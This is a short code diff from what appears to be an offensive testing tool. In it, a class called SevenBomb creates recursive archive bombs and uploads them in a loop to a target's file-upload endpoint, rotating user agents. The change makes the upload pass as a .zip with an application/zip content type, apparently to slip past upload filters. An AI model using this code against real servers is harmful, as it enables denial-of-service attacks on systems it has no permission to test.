@@ -5,7 +5,7 @@
 from infrastructure import factory
 from misc.pt_7z import make_recurssive_bomb
 from monitoring.ptcheckservice import print_error, attack_append_out_data, attack_checkservice_review
-from misc.pt_http import post_file_upload
+from misc.pt_http import post_upload
 from misc.globalfuncs import load_user_agents, parse_url
 # external libs
 from dataclasses import dataclass
@@ -56,7 +56,7 @@ class SevenBomb:
                     attack_checkservice_review(monitoring, use_json, json_obj, json_no, self.name)
                     break
                 
-                if post_file_upload(dst, str(randbytes(8).hex()) + ".7z", bomb, my_user_agents, my_accept_lang):
+                if post_upload(dst, str(randbytes(8).hex()) + ".zip", bomb, my_user_agents, my_accept_lang, "application/zip"):
                     ctx += 1
 
         except BaseException as err:
